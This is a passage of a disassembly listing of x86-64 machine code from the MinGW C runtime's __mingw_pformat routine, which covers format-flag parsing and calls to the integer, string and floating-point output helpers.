   1400059e0:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   1400059e4:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   1400059ea:	48 89 ee             	mov    %rbp,%rsi
   1400059ed:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400059f3:	e9 5f ff ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   1400059f8:	81 4c 24 78 80 00 00 	orl    $0x80,0x78(%rsp)
   1400059ff:	00 
   140005a00:	49 8d 5d 08          	lea    0x8(%r13),%rbx
   140005a04:	41 83 fa 03          	cmp    $0x3,%r10d
   140005a08:	0f 84 6f 07 00 00    	je     14000617d <__mingw_pformat+0x9fd>
   140005a0e:	49 63 4d 00          	movslq 0x0(%r13),%rcx
   140005a12:	41 83 fa 02          	cmp    $0x2,%r10d
   140005a16:	74 16                	je     140005a2e <__mingw_pformat+0x2ae>
   140005a18:	41 83 fa 01          	cmp    $0x1,%r10d
   140005a1c:	0f 84 0a 07 00 00    	je     14000612c <__mingw_pformat+0x9ac>
   140005a22:	48 0f be c1          	movsbq %cl,%rax
   140005a26:	41 83 fa 05          	cmp    $0x5,%r10d
   140005a2a:	48 0f 44 c8          	cmove  %rax,%rcx
   140005a2e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005a33:	49 89 dd             	mov    %rbx,%r13
   140005a36:	48 89 eb             	mov    %rbp,%rbx
   140005a39:	e8 a2 eb ff ff       	call   1400045e0 <__pformat_int.isra.0>
   140005a3e:	e9 29 fe ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005a43:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005a48:	49 8b 5d 00          	mov    0x0(%r13),%rbx
   140005a4c:	48 8d 05 65 5b 00 00 	lea    0x5b65(%rip),%rax        # 14000b5b8 <.rdata+0x8>
   140005a53:	48 85 db             	test   %rbx,%rbx
   140005a56:	48 0f 44 d8          	cmove  %rax,%rbx
   140005a5a:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   140005a61:	85 c0                	test   %eax,%eax
   140005a63:	0f 88 11 06 00 00    	js     14000607a <__mingw_pformat+0x8fa>
   140005a69:	48 63 d0             	movslq %eax,%rdx
   140005a6c:	48 89 d9             	mov    %rbx,%rcx
   140005a6f:	e8 0c 33 00 00       	call   140008d80 <wcsnlen>
   140005a74:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005a79:	48 89 d9             	mov    %rbx,%rcx
   140005a7c:	89 c2                	mov    %eax,%edx
   140005a7e:	e8 8d e1 ff ff       	call   140003c10 <__pformat_wputchars>
   140005a83:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005a88:	49 83 c5 08          	add    $0x8,%r13
   140005a8c:	48 89 eb             	mov    %rbp,%rbx
   140005a8f:	e9 d8 fd ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005a94:	45 85 f6             	test   %r14d,%r14d
   140005a97:	75 0a                	jne    140005aa3 <__mingw_pformat+0x323>
   140005a99:	39 7c 24 78          	cmp    %edi,0x78(%rsp)
   140005a9d:	0f 84 4f 06 00 00    	je     1400060f2 <__mingw_pformat+0x972>
   140005aa3:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005aa7:	49 8d 5d 08          	lea    0x8(%r13),%rbx
   140005aab:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005ab0:	b9 78 00 00 00       	mov    $0x78,%ecx
   140005ab5:	49 89 dd             	mov    %rbx,%r13
   140005ab8:	48 89 eb             	mov    %rbp,%rbx
   140005abb:	e8 10 e5 ff ff       	call   140003fd0 <__pformat_xint.isra.0>
   140005ac0:	e9 a7 fd ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005ac5:	41 83 ea 02          	sub    $0x2,%r10d
   140005ac9:	41 8b 45 00          	mov    0x0(%r13),%eax
   140005acd:	49 8d 5d 08          	lea    0x8(%r13),%rbx
   140005ad1:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   140005ad8:	ff ff ff ff 
   140005adc:	41 83 fa 01          	cmp    $0x1,%r10d
   140005ae0:	0f 86 71 04 00 00    	jbe    140005f57 <__mingw_pformat+0x7d7>
   140005ae6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005aeb:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005af0:	88 44 24 60          	mov    %al,0x60(%rsp)
   140005af4:	49 89 dd             	mov    %rbx,%r13
   140005af7:	ba 01 00 00 00       	mov    $0x1,%edx
   140005afc:	48 89 eb             	mov    %rbp,%rbx
   140005aff:	e8 9c e2 ff ff       	call   140003da0 <__pformat_putchars>
   140005b04:	e9 63 fd ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005b09:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005b0d:	49 8b 4d 00          	mov    0x0(%r13),%rcx
   140005b11:	83 c8 20             	or     $0x20,%eax
   140005b14:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140005b18:	a8 04                	test   $0x4,%al
   140005b1a:	0f 84 8c 03 00 00    	je     140005eac <__mingw_pformat+0x72c>
   140005b20:	8b 59 08             	mov    0x8(%rcx),%ebx
   140005b23:	48 8b 09             	mov    (%rcx),%rcx
   140005b26:	49 89 c9             	mov    %rcx,%r9
   140005b29:	44 0f bf d3          	movswl %bx,%r10d
   140005b2d:	48 89 da             	mov    %rbx,%rdx
   140005b30:	49 c1 e9 20          	shr    $0x20,%r9
   140005b34:	47 8d 1c 12          	lea    (%r10,%r10,1),%r11d
   140005b38:	41 81 e1 ff ff ff 7f 	and    $0x7fffffff,%r9d
   140005b3f:	45 0f b7 db          	movzwl %r11w,%r11d
   140005b43:	41 09 c9             	or     %ecx,%r9d
   140005b46:	45 89 c8             	mov    %r9d,%r8d
   140005b49:	41 f7 d8             	neg    %r8d
   140005b4c:	45 09 c8             	or     %r9d,%r8d
   140005b4f:	41 c1 e8 1f          	shr    $0x1f,%r8d
   140005b53:	45 09 d8             	or     %r11d,%r8d
   140005b56:	41 bb fe ff 00 00    	mov    $0xfffe,%r11d
   140005b5c:	45 29 c3             	sub    %r8d,%r11d
   140005b5f:	41 c1 eb 10          	shr    $0x10,%r11d
   140005b63:	0f 85 2d 05 00 00    	jne    140006096 <__mingw_pformat+0x916>
   140005b69:	66 85 db             	test   %bx,%bx
   140005b6c:	0f 88 75 05 00 00    	js     1400060e7 <__mingw_pformat+0x967>
   140005b72:	66 81 e2 ff 7f       	and    $0x7fff,%dx
   140005b77:	0f 84 5a 05 00 00    	je     1400060d7 <__mingw_pformat+0x957>
   140005b7d:	66 81 fa ff 7f       	cmp    $0x7fff,%dx
   140005b82:	75 09                	jne    140005b8d <__mingw_pformat+0x40d>
   140005b84:	45 85 c9             	test   %r9d,%r9d
   140005b87:	0f 84 17 07 00 00    	je     1400062a4 <__mingw_pformat+0xb24>
   140005b8d:	66 81 ea ff 3f       	sub    $0x3fff,%dx
   140005b92:	e9 b3 04 00 00       	jmp    14000604a <__mingw_pformat+0x8ca>
   140005b97:	41 83 ea 02          	sub    $0x2,%r10d
   140005b9b:	41 83 fa 01          	cmp    $0x1,%r10d
   140005b9f:	0f 86 a3 fe ff ff    	jbe    140005a48 <__mingw_pformat+0x2c8>
   140005ba5:	49 8b 4d 00          	mov    0x0(%r13),%rcx
   140005ba9:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005bae:	49 83 c5 08          	add    $0x8,%r13
   140005bb2:	48 89 eb             	mov    %rbp,%rbx
   140005bb5:	e8 36 e3 ff ff       	call   140003ef0 <__pformat_puts>
   140005bba:	e9 ad fc ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005bbf:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005bc3:	83 4c 24 78 04       	orl    $0x4,0x78(%rsp)
   140005bc8:	48 89 ee             	mov    %rbp,%rsi
   140005bcb:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140005bd1:	e9 81 fd ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005bd6:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005bda:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005bde:	83 c8 20             	or     $0x20,%eax
   140005be1:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140005be5:	a8 04                	test   $0x4,%al
   140005be7:	0f 84 d3 03 00 00    	je     140005fc0 <__mingw_pformat+0x840>
   140005bed:	db 2a                	fldt   (%rdx)
   140005bef:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005bf4:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005bf9:	db 7c 24 40          	fstpt  0x40(%rsp)
   140005bfd:	e8 6e f4 ff ff       	call   140005070 <__pformat_float>
   140005c02:	e9 81 fe ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140005c07:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005c0b:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005c0f:	83 c8 20             	or     $0x20,%eax
   140005c12:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140005c16:	a8 04                	test   $0x4,%al
   140005c18:	0f 84 d3 03 00 00    	je     140005ff1 <__mingw_pformat+0x871>
   140005c1e:	db 2a                	fldt   (%rdx)
   140005c20:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005c25:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005c2a:	db 7c 24 40          	fstpt  0x40(%rsp)
   140005c2e:	e8 1d f5 ff ff       	call   140005150 <__pformat_gfloat>
   140005c33:	e9 50 fe ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140005c38:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005c3c:	3c 68                	cmp    $0x68,%al
   140005c3e:	0f 84 bc 05 00 00    	je     140006200 <__mingw_pformat+0xa80>
   140005c44:	48 89 ee             	mov    %rbp,%rsi
   140005c47:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   140005c4d:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140005c53:	e9 ff fc ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005c58:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005c5c:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005c60:	83 c8 20             	or     $0x20,%eax
   140005c63:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140005c67:	a8 04                	test   $0x4,%al
   140005c69:	0f 84 20 03 00 00    	je     140005f8f <__mingw_pformat+0x80f>
   140005c6f:	db 2a                	fldt   (%rdx)
   140005c71:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005c76:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005c7b:	db 7c 24 40          	fstpt  0x40(%rsp)
   140005c7f:	e8 4c f3 ff ff       	call   140004fd0 <__pformat_efloat>
   140005c84:	e9 ff fd ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140005c89:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140005c8d:	48 89 eb             	mov    %rbp,%rbx
   140005c90:	e8 63 37 00 00       	call   1400093f8 <strerror>
   140005c95:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005c9a:	48 89 c1             	mov    %rax,%rcx
   140005c9d:	e8 4e e2 ff ff       	call   140003ef0 <__pformat_puts>
   140005ca2:	e9 c5 fb ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005ca7:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005cab:	3c 6c                	cmp    $0x6c,%al
   140005cad:	0f 84 34 05 00 00    	je     1400061e7 <__mingw_pformat+0xa67>
   140005cb3:	48 89 ee             	mov    %rbp,%rsi
   140005cb6:	41 ba 02 00 00 00    	mov    $0x2,%r10d
   140005cbc:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140005cc2:	e9 90 fc ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005cc7:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005ccb:	48 63 84 24 94 00 00 	movslq 0x94(%rsp),%rax
   140005cd2:	00 
   140005cd3:	49 83 c5 08          	add    $0x8,%r13
   140005cd7:	41 83 fa 05          	cmp    $0x5,%r10d
   140005cdb:	0f 84 ff 04 00 00    	je     1400061e0 <__mingw_pformat+0xa60>
   140005ce1:	41 83 fa 01          	cmp    $0x1,%r10d
   140005ce5:	0f 84 46 05 00 00    	je     140006231 <__mingw_pformat+0xab1>
   140005ceb:	41 83 fa 02          	cmp    $0x2,%r10d
   140005cef:	74 0a                	je     140005cfb <__mingw_pformat+0x57b>
   140005cf1:	41 83 fa 03          	cmp    $0x3,%r10d
   140005cf5:	0f 84 3a 04 00 00    	je     140006135 <__mingw_pformat+0x9b5>
   140005cfb:	89 02                	mov    %eax,(%rdx)
   140005cfd:	e9 8a fd ff ff       	jmp    140005a8c <__mingw_pformat+0x30c>
   140005d02:	45 85 f6             	test   %r14d,%r14d
   140005d05:	0f 85 45 fc ff ff    	jne    140005950 <__mingw_pformat+0x1d0>
   140005d0b:	83 4c 24 78 40       	orl    $0x40,0x78(%rsp)
   140005d10:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005d14:	48 89 ee             	mov    %rbp,%rsi
   140005d17:	e9 3b fc ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005d1c:	45 85 f6             	test   %r14d,%r14d
   140005d1f:	0f 85 2b fc ff ff    	jne    140005950 <__mingw_pformat+0x1d0>
   140005d25:	81 4c 24 78 00 08 00 	orl    $0x800,0x78(%rsp)
   140005d2c:	00 
   140005d2d:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005d31:	48 89 ee             	mov    %rbp,%rsi
   140005d34:	e9 1e fc ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005d39:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005d3d:	8b 9c 24 94 00 00 00 	mov    0x94(%rsp),%ebx
   140005d44:	f6 c4 40             	test   $0x40,%ah
   140005d47:	75 09                	jne    140005d52 <__mingw_pformat+0x5d2>
   140005d49:	39 9c 24 98 00 00 00 	cmp    %ebx,0x98(%rsp)
   140005d50:	7e 15                	jle    140005d67 <__mingw_pformat+0x5e7>
   140005d52:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140005d57:	f6 c4 20             	test   $0x20,%ah
   140005d5a:	0f 85 b9 04 00 00    	jne    140006219 <__mingw_pformat+0xa99>
   140005d60:	48 63 c3             	movslq %ebx,%rax
   140005d63:	c6 04 02 25          	movb   $0x25,(%rdx,%rax,1)
   140005d67:	83 c3 01             	add    $0x1,%ebx
   140005d6a:	89 9c 24 94 00 00 00 	mov    %ebx,0x94(%rsp)
   140005d71:	48 89 eb             	mov    %rbp,%rbx
   140005d74:	e9 f3 fa ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005d79:	45 85 f6             	test   %r14d,%r14d
   140005d7c:	0f 85 ce fb ff ff    	jne    140005950 <__mingw_pformat+0x1d0>
   140005d82:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140005d87:	4c 89 5c 24 38       	mov    %r11,0x38(%rsp)
   140005d8c:	44 89 54 24 34       	mov    %r10d,0x34(%rsp)
   140005d91:	81 4c 24 78 00 10 00 	orl    $0x1000,0x78(%rsp)
   140005d98:	00 
   140005d99:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005d9e:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   140005da5:	00 
   140005da6:	e8 1d 36 00 00       	call   1400093c8 <localeconv>
   140005dab:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140005db0:	48 8d 4c 24 5e       	lea    0x5e(%rsp),%rcx
   140005db5:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140005dbb:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140005dbf:	e8 7c 33 00 00       	call   140009140 <mbrtowc>
   140005dc4:	44 8b 54 24 34       	mov    0x34(%rsp),%r10d
   140005dc9:	4c 8b 5c 24 38       	mov    0x38(%rsp),%r11
   140005dce:	85 c0                	test   %eax,%eax
   140005dd0:	7e 0d                	jle    140005ddf <__mingw_pformat+0x65f>
   140005dd2:	0f b7 54 24 5e       	movzwl 0x5e(%rsp),%edx
   140005dd7:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
   140005dde:	00 
   140005ddf:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
   140005de6:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005dea:	48 89 ee             	mov    %rbp,%rsi
   140005ded:	e9 65 fb ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005df2:	4d 85 db             	test   %r11,%r11
   140005df5:	74 76                	je     140005e6d <__mingw_pformat+0x6ed>
   140005df7:	41 f7 c6 fd ff ff ff 	test   $0xfffffffd,%r14d
   140005dfe:	0f 85 be 02 00 00    	jne    1400060c2 <__mingw_pformat+0x942>
   140005e04:	41 8b 45 00          	mov    0x0(%r13),%eax
   140005e08:	49 8d 55 08          	lea    0x8(%r13),%rdx
   140005e0c:	41 89 03             	mov    %eax,(%r11)
   140005e0f:	85 c0                	test   %eax,%eax
   140005e11:	0f 88 22 04 00 00    	js     140006239 <__mingw_pformat+0xab9>
   140005e17:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005e1b:	49 89 d5             	mov    %rdx,%r13
   140005e1e:	48 89 ee             	mov    %rbp,%rsi
   140005e21:	45 31 db             	xor    %r11d,%r11d
   140005e24:	e9 2e fb ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005e29:	45 85 f6             	test   %r14d,%r14d
   140005e2c:	0f 85 1e fb ff ff    	jne    140005950 <__mingw_pformat+0x1d0>
   140005e32:	81 4c 24 78 00 01 00 	orl    $0x100,0x78(%rsp)
   140005e39:	00 
   140005e3a:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005e3e:	48 89 ee             	mov    %rbp,%rsi
   140005e41:	e9 11 fb ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005e46:	45 85 f6             	test   %r14d,%r14d
   140005e49:	0f 85 01 fb ff ff    	jne    140005950 <__mingw_pformat+0x1d0>
   140005e4f:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
   140005e56:	00 
   140005e57:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005e5b:	48 89 ee             	mov    %rbp,%rsi
   140005e5e:	e9 f4 fa ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005e63:	41 83 fe 01          	cmp    $0x1,%r14d
   140005e67:	0f 86 e2 02 00 00    	jbe    14000614f <__mingw_pformat+0x9cf>
   140005e6d:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005e71:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140005e77:	48 89 ee             	mov    %rbp,%rsi
   140005e7a:	e9 d8 fa ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005e7f:	45 85 f6             	test   %r14d,%r14d
   140005e82:	0f 85 d1 01 00 00    	jne    140006059 <__mingw_pformat+0x8d9>
   140005e88:	81 4c 24 78 00 02 00 	orl    $0x200,0x78(%rsp)
   140005e8f:	00 
   140005e90:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140005e94:	48 89 ee             	mov    %rbp,%rsi
   140005e97:	e9 bb fa ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140005e9c:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005ea0:	49 8b 4d 00          	mov    0x0(%r13),%rcx
   140005ea4:	a8 04                	test   $0x4,%al
   140005ea6:	0f 85 74 fc ff ff    	jne    140005b20 <__mingw_pformat+0x3a0>
   140005eac:	49 89 c8             	mov    %rcx,%r8
   140005eaf:	89 ca                	mov    %ecx,%edx
   140005eb1:	49 c1 e8 20          	shr    $0x20,%r8
   140005eb5:	f7 da                	neg    %edx
   140005eb7:	45 89 c1             	mov    %r8d,%r9d
   140005eba:	09 ca                	or     %ecx,%edx
   140005ebc:	41 81 e1 ff ff ff 7f 	and    $0x7fffffff,%r9d
   140005ec3:	c1 ea 1f             	shr    $0x1f,%edx
   140005ec6:	44 09 ca             	or     %r9d,%edx
   140005ec9:	41 b9 00 00 f0 7f    	mov    $0x7ff00000,%r9d
   140005ecf:	41 39 d1             	cmp    %edx,%r9d
   140005ed2:	0f 88 be 01 00 00    	js     140006096 <__mingw_pformat+0x916>
   140005ed8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005edd:	dd 44 24 20          	fldl   0x20(%rsp)
   140005ee1:	db 7c 24 20          	fstpt  0x20(%rsp)
   140005ee5:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140005eea:	66 85 d2             	test   %dx,%dx
   140005eed:	79 06                	jns    140005ef5 <__mingw_pformat+0x775>
   140005eef:	0c 80                	or     $0x80,%al
   140005ef1:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140005ef5:	44 89 c0             	mov    %r8d,%eax
   140005ef8:	41 81 e0 00 00 f0 7f 	and    $0x7ff00000,%r8d
   140005eff:	25 ff ff 0f 00       	and    $0xfffff,%eax
   140005f04:	41 81 f8 00 00 f0 7f 	cmp    $0x7ff00000,%r8d
   140005f0b:	41 0f 95 c1          	setne  %r9b
   140005f0f:	09 c8                	or     %ecx,%eax
   140005f11:	0f 95 c1             	setne  %cl
   140005f14:	41 08 c9             	or     %cl,%r9b
   140005f17:	0f 85 f5 00 00 00    	jne    140006012 <__mingw_pformat+0x892>
   140005f1d:	44 09 c0             	or     %r8d,%eax
   140005f20:	0f 84 ec 00 00 00    	je     140006012 <__mingw_pformat+0x892>
   140005f26:	89 d1                	mov    %edx,%ecx
   140005f28:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005f2d:	48 8d 15 96 56 00 00 	lea    0x5696(%rip),%rdx        # 14000b5ca <.rdata+0x1a>
   140005f34:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   140005f3a:	e8 01 e0 ff ff       	call   140003f40 <__pformat_emit_inf_or_nan>
   140005f3f:	e9 44 fb ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140005f44:	0f 1f 40 00          	nopl   0x0(%rax)
   140005f48:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   140005f4f:	ff ff ff ff 
   140005f53:	49 8d 5d 08          	lea    0x8(%r13),%rbx
   140005f57:	41 8b 45 00          	mov    0x0(%r13),%eax
   140005f5b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005f60:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005f65:	49 89 dd             	mov    %rbx,%r13
   140005f68:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f6d:	48 89 eb             	mov    %rbp,%rbx
   140005f70:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   140005f75:	e8 96 dc ff ff       	call   140003c10 <__pformat_wputchars>
   140005f7a:	e9 ed f8 ff ff       	jmp    14000586c <__mingw_pformat+0xec>
   140005f7f:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005f83:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005f87:	a8 04                	test   $0x4,%al
   140005f89:	0f 85 e0 fc ff ff    	jne    140005c6f <__mingw_pformat+0x4ef>
   140005f8f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140005f94:	dd 44 24 20          	fldl   0x20(%rsp)
   140005f98:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005f9d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005fa2:	db 7c 24 40          	fstpt  0x40(%rsp)
   140005fa6:	e8 25 f0 ff ff       	call   140004fd0 <__pformat_efloat>
   140005fab:	e9 d8 fa ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140005fb0:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005fb4:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005fb8:	a8 04                	test   $0x4,%al
   140005fba:	0f 85 2d fc ff ff    	jne    140005bed <__mingw_pformat+0x46d>
   140005fc0:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140005fc5:	dd 44 24 20          	fldl   0x20(%rsp)
   140005fc9:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005fce:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005fd3:	db 7c 24 40          	fstpt  0x40(%rsp)
   140005fd7:	e8 94 f0 ff ff       	call   140005070 <__pformat_float>
   140005fdc:	e9 a7 fa ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140005fe1:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140005fe5:	49 8b 55 00          	mov    0x0(%r13),%rdx
   140005fe9:	a8 04                	test   $0x4,%al
   140005feb:	0f 85 2d fc ff ff    	jne    140005c1e <__mingw_pformat+0x49e>
   140005ff1:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140005ff6:	dd 44 24 20          	fldl   0x20(%rsp)
   140005ffa:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005fff:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006004:	db 7c 24 40          	fstpt  0x40(%rsp)
   140006008:	e8 43 f1 ff ff       	call   140005150 <__pformat_gfloat>
   14000600d:	e9 76 fa ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140006012:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006017:	66 81 e2 ff 7f       	and    $0x7fff,%dx
   14000601c:	0f 84 f2 00 00 00    	je     140006114 <__mingw_pformat+0x994>
   140006022:	66 81 fa 00 3c       	cmp    $0x3c00,%dx
   140006027:	0f 8f de 00 00 00    	jg     14000610b <__mingw_pformat+0x98b>
   14000602d:	44 0f bf c2          	movswl %dx,%r8d
   140006031:	b9 01 3c 00 00       	mov    $0x3c01,%ecx
   140006036:	44 29 c1             	sub    %r8d,%ecx
   140006039:	48 d3 e8             	shr    %cl,%rax
   14000603c:	01 ca                	add    %ecx,%edx
   14000603e:	66 81 ea fc 3f       	sub    $0x3ffc,%dx
   140006043:	48 c1 e8 03          	shr    $0x3,%rax
   140006047:	48 89 c1             	mov    %rax,%rcx
   14000604a:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000604f:	e8 5c f2 ff ff       	call   1400052b0 <__pformat_emit_xfloat.isra.0>
   140006054:	e9 2f fa ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140006059:	41 83 fe 04          	cmp    $0x4,%r14d
   14000605d:	0f 84 3f 01 00 00    	je     1400061a2 <__mingw_pformat+0xa22>
   140006063:	b9 30 00 00 00       	mov    $0x30,%ecx
   140006068:	41 83 fe 02          	cmp    $0x2,%r14d
   14000606c:	b8 03 00 00 00       	mov    $0x3,%eax
   140006071:	44 0f 44 f0          	cmove  %eax,%r14d
   140006075:	e9 ba f8 ff ff       	jmp    140005934 <__mingw_pformat+0x1b4>
   14000607a:	48 89 d9             	mov    %rbx,%rcx
   14000607d:	e8 96 33 00 00       	call   140009418 <wcslen>
   140006082:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140006087:	48 89 d9             	mov    %rbx,%rcx
   14000608a:	89 c2                	mov    %eax,%edx
   14000608c:	e8 7f db ff ff       	call   140003c10 <__pformat_wputchars>
   140006091:	e9 f2 f9 ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140006096:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000609b:	48 8d 15 24 55 00 00 	lea    0x5524(%rip),%rdx        # 14000b5c6 <.rdata+0x16>
   1400060a2:	31 c9                	xor    %ecx,%ecx
   1400060a4:	e8 97 de ff ff       	call   140003f40 <__pformat_emit_inf_or_nan>
   1400060a9:	e9 da f9 ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   1400060ae:	48 89 ee             	mov    %rbp,%rsi
   1400060b1:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   1400060b7:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400060bd:	e9 95 f8 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   1400060c2:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   1400060c6:	45 31 db             	xor    %r11d,%r11d
   1400060c9:	48 89 ee             	mov    %rbp,%rsi
   1400060cc:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400060d2:	e9 80 f8 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   1400060d7:	48 85 c9             	test   %rcx,%rcx
   1400060da:	b8 02 c0 ff ff       	mov    $0xffffc002,%eax
   1400060df:	0f 45 d0             	cmovne %eax,%edx
   1400060e2:	e9 63 ff ff ff       	jmp    14000604a <__mingw_pformat+0x8ca>
   1400060e7:	0c 80                	or     $0x80,%al
   1400060e9:	89 44 24 78          	mov    %eax,0x78(%rsp)
   1400060ed:	e9 80 fa ff ff       	jmp    140005b72 <__mingw_pformat+0x3f2>
   1400060f2:	c7 84 24 80 00 00 00 	movl   $0x10,0x80(%rsp)
   1400060f9:	10 00 00 00 
   1400060fd:	89 f8                	mov    %edi,%eax
   1400060ff:	80 cc 02             	or     $0x2,%ah
   140006102:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140006106:	e9 98 f9 ff ff       	jmp    140005aa3 <__mingw_pformat+0x323>
   14000610b:	66 85 d2             	test   %dx,%dx
   14000610e:	0f 85 2a ff ff ff    	jne    14000603e <__mingw_pformat+0x8be>
   140006114:	48 85 c0             	test   %rax,%rax
   140006117:	b9 05 fc ff ff       	mov    $0xfffffc05,%ecx
   14000611c:	0f 45 d1             	cmovne %ecx,%edx
